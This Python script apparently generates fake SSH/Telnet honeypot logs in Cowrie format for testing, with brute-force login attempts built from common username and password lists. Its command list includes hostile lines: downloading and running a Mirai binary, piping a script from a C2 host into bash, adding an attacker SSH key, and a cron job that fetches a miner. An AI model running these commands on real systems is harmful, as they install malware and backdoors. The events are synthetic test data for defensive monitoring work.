import json, random, datetime

print("[*] Generating rich SSH & Telnet Honeypot telemetry...")

USERS = ["root", "admin", "ubuntu", "support", "user", "postgres", "cisco", "oracle", "test", "ftpuser"]
PASSWORDS = ["123456", "admin123", "password", "toor", "root123", "12345678", "cisco123", "admin", "welcome", "pass1234", "default", "qwerty"]
IPS = ["185.220.101.5", "45.154.255.88", "194.26.29.112", "103.203.57.18", "89.248.163.74", "79.124.62.122", "172.17.0.1", "127.0.0.1"]

COMMANDS = [
    "whoami", "uname -a", "cat /proc/cpuinfo", "id", "ifconfig", "free -m",
    "wget http://185.190.140.2/bins/mirai.arm7 -O /tmp/arm7; chmod +x /tmp/arm7; /tmp/arm7",
    "curl -s http://evil-c2.net/payload.sh | bash",
    "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGattacker root@c2' >> ~/.ssh/authorized_keys",
    "crontab -l; echo '* * * * * curl http://miner.pool/xmr.sh | sh' | crontab -",
    "ps aux | grep miner", "netstat -antp", "cat /etc/passwd"
]

events = []
now = datetime.datetime.now(datetime.timezone.utc)

# 1. Generate 120 Brute-Force Login attempts
for i in range(120):
    t = now - datetime.timedelta(minutes=random.randint(1, 300))
    ip = random.choice(IPS)
    u = random.choice(USERS)
    p = random.choice(PASSWORDS)
    is_success = (i % 25 == 0) # occasional successful login
    
    events.append({
        "eventid": "cowrie.login.success" if is_success else "cowrie.login.failed",
        "timestamp": t.isoformat(),
        "src_ip": ip,
        "src_port": random.randint(30000, 65000),
        "dst_port": random.choice([22, 2222, 23, 2223]),
        "username": u,
        "password": p,
        "session": f"sess_{random.randint(1000, 9999)}"
    })

# 2. Generate Post-Exploitation Commands
for cmd in COMMANDS:
    t = now - datetime.timedelta(minutes=random.randint(1, 60))
    events.append({
        "eventid": "cowrie.command.input",
        "timestamp": t.isoformat(),
        "src_ip": random.choice(["45.154.255.88", "185.220.101.5", "89.248.163.74", "172.17.0.1"]),
        "input": cmd,
        "session": f"sess_{random.randint(1000, 9999)}"
    })

# Write to data/cowrie/cowrie.json
out_path = "data/cowrie/cowrie.json"
with open(out_path, "a") as f:
    for ev in events:
        f.write(json.dumps(ev) + "\n")

print(f"[+] Successfully wrote {len(events)} SSH/Telnet login & command events to {out_path}!")
